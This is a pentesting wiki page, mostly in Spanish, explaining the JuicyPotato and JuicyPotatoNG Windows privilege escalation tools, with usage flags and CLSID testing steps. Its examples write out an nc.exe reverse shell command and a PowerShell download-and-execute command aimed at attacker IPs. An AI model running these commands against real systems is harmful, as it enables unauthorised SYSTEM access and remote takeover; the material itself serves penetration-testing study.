# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato es legacy. Generalmente funciona en versiones de Windows hasta Windows 10 1803 / Windows Server 2016. Los cambios de Microsoft introducidos a partir de Windows 10 1809 / Server 2019 rompieron la técnica original. Para esas builds y posteriores, considera alternativas modernas como PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato y otras. Consulta la página abajo para opciones y uso actualizados.


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (abusando de los privilegios dorados) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Una versión azucarada de_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, con un poco de jugo, es decir **otra herramienta de Local Privilege Escalation, desde Windows Service Accounts hasta NT AUTHORITY\SYSTEM**_

#### Puedes descargar juicypotato desde [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Notas rápidas de compatibilidad

- Funciona de forma fiable hasta Windows 10 1803 y Windows Server 2016 cuando el contexto actual tiene SeImpersonatePrivilege o SeAssignPrimaryTokenPrivilege.
- Roto por el hardening de Microsoft en Windows 10 1809 / Windows Server 2019 y posteriores. Prefiere las alternativas enlazadas arriba para esas builds.

### Resumen <a href="#summary" id="summary"></a>

[**Del Readme de juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) y sus [variants](https://github.com/decoder-it/lonelypotato) aprovechan la cadena de escalada de privilegios basada en el servicio [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) que tiene el listener MiTM en `127.0.0.1:6666` y cuando posees los privilegios `SeImpersonate` o `SeAssignPrimaryToken`. Durante una revisión de builds de Windows encontramos una configuración donde `BITS` estaba intencionalmente deshabilitado y el puerto `6666` ocupado.

Decidimos weaponizar [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Saluda a Juicy Potato**.

> Para la teoría, consulta [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) y sigue la cadena de enlaces y referencias.

Descubrimos que, además de `BITS`, hay varios servidores COM que podemos abusar. Solo necesitan:

1. ser instanciables por el usuario actual, normalmente un “service user” que tiene privilegios de impersonación
2. implementar la interfaz `IMarshal`
3. ejecutarse como un usuario elevado (SYSTEM, Administrator, …)

Tras algunas pruebas obtuvimos y testeamos una lista extensa de [CLSID’s interesantes](http://ohpe.it/juicy-potato/CLSID/) en varias versiones de Windows.

### Detalles jugosos <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato te permite:

- **CLSID objetivo** _elige cualquier CLSID que quieras._ [_Here_](http://ohpe.it/juicy-potato/CLSID/) _puedes encontrar la lista organizada por OS._
- **COM Listening port** _define el puerto de escucha COM que prefieras (en lugar del 6666 hardcoded y marshalled)_
- **COM Listening IP address** _enlaza el servidor a cualquier IP_
- **Process creation mode** _dependiendo de los privilegios del usuario impersonado puedes elegir entre:_
- `CreateProcessWithToken` (necesita `SeImpersonate`)
- `CreateProcessAsUser` (necesita `SeAssignPrimaryToken`)
- `both`
- **Process to launch** _lanza un ejecutable o script si la explotación tiene éxito_
- **Process Argument** _personaliza los argumentos del proceso lanzado_
- **RPC Server address** _para un enfoque sigiloso puedes autenticarte en un servidor RPC externo_
- **RPC Server port** _útil si quieres autenticarte en un servidor externo y el firewall bloquea el puerto `135`…_
- **TEST mode** _principalmente para propósitos de prueba, p.ej. testear CLSIDs. Crea el DCOM e imprime el usuario del token. Ver_ [_here for testing_](http://ohpe.it/juicy-potato/Test/)

### Uso <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Final thoughts <a href="#final-thoughts" id="final-thoughts"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

Si el usuario tiene los privilegios `SeImpersonate` o `SeAssignPrimaryToken` entonces eres **SYSTEM**.

Es casi imposible evitar el abuso de todos estos COM Servers. Podrías pensar en modificar los permisos de estos objetos mediante `DCOMCNFG`, pero buena suerte, esto va a ser un desafío.

La solución real es proteger cuentas y aplicaciones sensibles que se ejecutan bajo las cuentas `* SERVICE`. Detener `DCOM` sin duda inhibiría este exploit pero podría tener un impacto serio en el sistema operativo subyacente.

From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## JuicyPotatoNG (2022+)

JuicyPotatoNG re-introduces a JuicyPotato-style local privilege escalation on modern Windows by combining:
- DCOM OXID resolution to a local RPC server on a chosen port, avoiding the old hardcoded 127.0.0.1:6666 listener.
- An SSPI hook to capture and impersonate the inbound SYSTEM authentication without requiring RpcImpersonateClient, which also enables CreateProcessAsUser when only SeAssignPrimaryTokenPrivilege is present.
- Tricks to satisfy DCOM activation constraints (e.g., the former INTERACTIVE-group requirement when targeting PrintNotify / ActiveX Installer Service classes).

Important notes (evolving behavior across builds):
- September 2022: Initial technique worked on supported Windows 10/11 and Server targets using the “INTERACTIVE trick”.
- January 2023 update from the authors: Microsoft later blocked the INTERACTIVE trick. A different CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) restores exploitation but only on Windows 11 / Server 2022 according to their post.

Basic usage (more flags in the help):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
If you’re targeting Windows 10 1809 / Server 2019 where classic JuicyPotato is patched, prefer the alternatives linked at the top (RoguePotato, PrintSpoofer, EfsPotato/GodPotato, etc.). NG may be situational depending on build and service state.

## Examples

Nota: Visit [this page](https://ohpe.it/juicy-potato/CLSID/) para una lista de CLSIDs para probar.

### Get a nc.exe reverse shell
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Launch a new CMD (if you have RDP access)

![](<../../images/image (300).png>)

## CLSID Problems

A menudo, el CLSID por defecto que usa JuicyPotato **no funciona** y el exploit falla. Normalmente se necesitan varios intentos para encontrar un **CLSID que funcione**. Para obtener una lista de CLSIDs para probar en un sistema operativo específico, debes visitar esta página:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **Checking CLSIDs**

Primero, necesitarás algunos ejecutables además de juicypotato.exe.

Descarga [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) y cárgalo en tu sesión de PS, y descarga y ejecuta [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Ese script creará una lista de posibles CLSIDs para probar.

Luego descarga [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(cambia la ruta a la lista de CLSID y al ejecutable de juicypotato) y ejecútalo. Empezará a probar cada CLSID, y **cuando cambie el número de puerto, significará que el CLSID funcionó**.

**Comprueba** los CLSIDs que funcionan **usando el parámetro -c**

## References

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [Giving JuicyPotato a second chance: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)

{{#include ../../banners/hacktricks-training.md}}
